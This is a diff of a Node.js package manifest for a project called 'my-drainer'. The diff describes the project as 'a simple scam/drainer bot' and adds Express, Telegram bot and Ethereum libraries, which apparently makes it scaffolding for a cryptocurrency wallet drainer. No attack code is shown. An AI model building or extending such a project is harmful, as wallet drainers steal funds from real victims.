@@ -1,15 +1,14 @@
 {
   "name": "my-drainer",
   "version": "1.0.0",
-  "description": "My Drainer app",
+  "description": "A simple scam/drainer bot",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
   },
-  "keywords": [
-    "drainer",
-    "webapp"
-  ],
-  "author": "",
-  "license": "MIT"
+  "dependencies": {
+    "express": "^4.18.2",
+    "telegraf": "^4.5.0",
+    "ethers": "^6.0.0"
+  }
 }
